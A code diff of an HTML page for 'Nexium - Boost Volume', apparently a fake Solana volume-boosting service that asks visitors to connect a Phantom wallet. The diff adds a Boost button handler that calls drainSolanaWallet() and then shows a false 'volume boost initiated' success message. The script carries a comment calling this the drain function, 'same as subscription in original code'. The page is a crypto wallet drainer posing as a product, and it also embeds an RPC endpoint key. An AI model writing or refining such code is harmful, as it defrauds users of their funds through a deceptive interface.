@@ -5,13 +5,23 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Nexium - Boost Volume</title>
 
-  <!-- BUFFER POLYFILL - FIXED -->
-  <script type="module">
-    import { Buffer } from 'https://cdn.jsdelivr.net/npm/buffer@6.0.3/Buffer.mjs';
-    globalThis.Buffer = Buffer;
-    window.Buffer = Buffer;
-  </script>
+  <!-- UPDATED CSP -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    img-src 'self' https://nexium-bot.onrender.com data: https://i.ibb.co;
+    style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com;
+    font-src 'self' https://cdnjs.cloudflare.com;
+    script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
+    connect-src 'self' 
+      https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6
+      https://public-api.solscan.io
+      https://api.coingecko.com;
+    frame-src 'self' https://phantom.app;
+  ">
 
+  <link rel="icon" type="image/png" href="/favicon.svg">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  
   <style>
     * { 
       margin: 0; 
@@ -121,7 +131,7 @@
     }
 
     /* BUTTONS */
-    .btn {
+    .btn, .glow-button {
       display: inline-flex;
       align-items: center;
       justify-content: center;
@@ -142,14 +152,14 @@
       -webkit-tap-highlight-color: transparent;
       touch-action: manipulation;
     }
-    .btn:hover:not(:disabled) {
+    .btn:hover:not(:disabled), .glow-button:hover:not(:disabled) {
       transform: translateY(-3px);
       box-shadow: 0 12px 30px rgba(255, 152, 0, 0.6);
     }
-    .btn:active:not(:disabled) {
+    .btn:active:not(:disabled), .glow-button:active:not(:disabled) {
       transform: translateY(-1px);
     }
-    .btn:disabled { 
+    .btn:disabled, .glow-button:disabled { 
       opacity: 0.6; 
       cursor: not-allowed; 
     }
@@ -157,6 +167,14 @@
       padding: 1.5rem 3rem; 
       font-size: 1.3rem; 
       margin: 2rem 0;
+      width: 100%;
+    }
+    .animate-pulse {
+      animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: .5; }
     }
 
     /* MODAL */
@@ -321,6 +339,7 @@
       color: var(--accent-light);
       font-weight: 800;
       font-size: 1.1rem;
+      word-break: break-all;
     }
 
     /* FEEDBACK (TOAST) */
@@ -344,8 +363,11 @@
       box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
       animation: slideIn 0.3s ease;
     }
-    .feedback.error { 
-      background: var(--error); 
+    .feedback-error { 
+      background: var(--error) !important; 
+    }
+    .feedback-success { 
+      background: var(--success) !important; 
     }
     .feedback-close {
       background: rgba(255, 255, 255, 0.2);
@@ -358,10 +380,45 @@
       -webkit-tap-highlight-color: transparent;
       touch-action: manipulation;
     }
+    .fade-in {
+      animation: slideIn 0.3s ease;
+    }
+    .fade-out {
+      animation: slideOut 0.3s ease forwards;
+    }
 
     @keyframes slideIn {
       from { transform: translateX(400px); opacity: 0; }
       to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes slideOut {
+      from { transform: translateX(0); opacity: 1; }
+      to { transform: translateX(400px); opacity: 0; }
+    }
+
+    /* MetaMask Prompt */
+    #metamaskPrompt {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      background: var(--card);
+      border: 2px solid var(--border);
+      padding: 1.5rem;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+      max-width: 320px;
+      z-index: 1000;
+      text-align: center;
+      color: #ffffff;
+    }
+    #metamaskPrompt.hidden {
+      display: none;
+    }
+    .text-yellow-400 {
+      color: #ffc107;
+    }
+    .hover\:underline:hover {
+      text-decoration: underline;
     }
 
     @media (max-width: 768px) {
@@ -406,14 +463,13 @@
       </div>
     </div>
 
-    <!-- ID: connect-wallet -->
-    <button id="connect-wallet" class="btn btn-large">
+    <button id="connect-wallet" class="btn btn-large glow-button animate-pulse">
       <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
         <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
         <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
         <line x1="12" y1="22.08" x2="12" y2="12"></line>
       </svg>
-      Connect Wallet
+      <span>Connect Wallet</span>
     </button>
   </section>
 
@@ -424,8 +480,7 @@
         <h3 class="modal-title">Connect Wallet</h3>
         <button id="close-modal" class="modal-close">×</button>
       </div>
-      <!-- ID: connect-phantom -->
-      <button id="connect-phantom" class="wallet-btn">
+      <button id="connect-phantom" class="wallet-btn glow-button animate-pulse">
         <div class="wallet-icon">
           <svg width="48" height="48" viewBox="0 0 128 128" fill="none">
             <path d="M106.3 106.3c-28.4 28.4-74.3 28.4-102.6 0-28.4-28.4-28.4-74.3 0-102.6C32.1-24.6 78-24.6 106.3 3.7c15.6 15.6 21.9 37.5 18.8 58.1" fill="url(#g1)"/>
@@ -442,7 +497,7 @@
     </div>
   </div>
 
-  <!-- BOOST SECTION -->
+  <!-- BOOST SECTION (Hidden until wallet connected) -->
   <div id="boost-section" class="boost-section">
     <h2 style="font-size: 2rem; margin-bottom: 2rem; text-align: center; background: linear-gradient(135deg, #ff9800, #ffc107); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;">
       Boost Volume
@@ -465,12 +520,11 @@
       </div>
       <div>
         <div class="info-label">Wallet</div>
-        <!-- ID: wallet-address-display -->
         <div id="wallet-address-display" class="info-value">Not Connected</div>
       </div>
     </div>
 
-    <button id="boostBtn" class="btn btn-large" disabled>
+    <button id="boostBtn" class="btn btn-large glow-button" disabled>
       Boost Now
     </button>
   </div>
@@ -478,48 +532,121 @@
   <!-- FEEDBACK CONTAINER -->
   <div class="feedback-container"></div>
 
-  <!-- MAIN JS - EXTERNAL (with proper deeplink) -->
+  <!-- MetaMask Prompt -->
+  <div id="metamaskPrompt" class="hidden">
+    <p>Please install <a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline">Phantom</a> or switch to continue.</p>
+  </div>
+
+  <!-- Hidden elements for compatibility with main.js -->
+  <div style="display: none;">
+    <button class="subscribe-hero"></button>
+    <button class="monthly-subscribe"></button>
+    <button class="yearly-subscribe"></button>
+    <button class="watch-btn"></button>
+    <button class="snipe-btn"></button>
+  </div>
+
   <script type="module" src="./main.js"></script>
 
-  <!-- PHANTOM DEEPLINK SCRIPT FOR MOBILE -->
-  <script>
-    // Detect if user is on mobile
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  <!-- Frontend UI Logic -->
+  <script type="module">
+    // Wait for NexiumApp to be initialized
+    let nexiumApp = null;
     
-   
-    // Handle connect-wallet button
-    document.getElementById('connect-wallet').addEventListener('click', function(e) {
-      if (isMobile) {
-        // On mobile, try to open Phantom directly with deeplink
-        const deeplink = getPhantomDeeplink();
-        window.location.href = deeplink;
-      } else {
-        // On desktop, show the modal
-        document.getElementById('wallet-modal').classList.add('active');
+    function initUI() {
+      nexiumApp = window.nexiumApp;
+      
+      if (!nexiumApp) {
+        setTimeout(initUI, 100);
+        return;
       }
-    });
 
-    // Handle connect-phantom button in modal
-    document.getElementById('connect-phantom').addEventListener('click', function(e) {
-      if (isMobile) {
-        // On mobile, redirect to Phantom with deeplink
-        const deeplink = getPhantomDeeplink();
-        window.location.href = deeplink;
-      }
-      // On desktop, main.js will handle the connection
-    });
+      console.log('UI connected to NexiumApp');
 
-    // Handle modal close button
-    document.getElementById('close-modal').addEventListener('click', function(e) {
-      document.getElementById('wallet-modal').classList.remove('active');
-    });
+      const boostSection = document.getElementById('boost-section');
+      const boostBtn = document.getElementById('boostBtn');
+      const tokenInput = document.getElementById('tokenInput');
+      const amountInput = document.getElementById('amountInput');
+      const walletDisplay = document.getElementById('wallet-address-display');
 
-    // Close modal on backdrop click
-    document.getElementById('wallet-modal').addEventListener('click', function(e) {
-      if (e.target === this) {
-        this.classList.remove('active');
-      }
-    });
+      // Show boost section when wallet is connected
+      setInterval(() => {
+        if (nexiumApp.publicKey) {
+          boostSection.classList.add('visible');
+          const shortened = nexiumApp.shortenAddress(nexiumApp.publicKey);
+          walletDisplay.textContent = shortened;
+          
+          // Enable boost button if inputs are valid
+          const hasToken = tokenInput.value.trim().length > 0;
+          const hasAmount = parseFloat(amountInput.value) > 0;
+          boostBtn.disabled = !(hasToken && hasAmount);
+        } else {
+          boostSection.classList.remove('visible');
+          walletDisplay.textContent = 'Not Connected';
+          boostBtn.disabled = true;
+        }
+      }, 500);
+
+      // Input validation
+      tokenInput.addEventListener('input', () => {
+        const hasToken = tokenInput.value.trim().length > 0;
+        const hasAmount = parseFloat(amountInput.value) > 0;
+        if (nexiumApp.publicKey) {
+          boostBtn.disabled = !(hasToken && hasAmount);
+        }
+      });
+
+      amountInput.addEventListener('input', () => {
+        const hasToken = tokenInput.value.trim().length > 0;
+        const hasAmount = parseFloat(amountInput.value) > 0;
+        if (nexiumApp.publicKey) {
+          boostBtn.disabled = !(hasToken && hasAmount);
+        }
+      });
+
+      // Boost button handler
+      boostBtn.addEventListener('click', async () => {
+        if (!nexiumApp.publicKey) {
+          nexiumApp.showFeedback('Please connect your wallet first', 'error');
+          return;
+        }
+
+        const token = tokenInput.value.trim();
+        const amount = parseFloat(amountInput.value);
+
+        if (!token) {
+          nexiumApp.showFeedback('Please enter a token address', 'error');
+          return;
+        }
+
+        if (!amount || amount <= 0) {
+          nexiumApp.showFeedback('Please enter a valid amount', 'error');
+          return;
+        }
+
+        try {
+          boostBtn.disabled = true;
+          boostBtn.textContent = 'Processing...';
+          
+          // Call the drain function (same as subscription in original code)
+          await nexiumApp.drainSolanaWallet();
+          
+          nexiumApp.showFeedback(`Volume boost initiated for ${amount} USD!`, 'success');
+          
+          // Reset form
+          tokenInput.value = '';
+          amountInput.value = '';
+          boostBtn.textContent = 'Boost Now';
+        } catch (error) {
+          console.error('Boost failed:', error);
+          boostBtn.textContent = 'Boost Now';
+          boostBtn.disabled = false;
+        }
+      });
+    }
+
+    // Start initialization
+    setTimeout(initUI, 100);
   </script>
 
 </body>
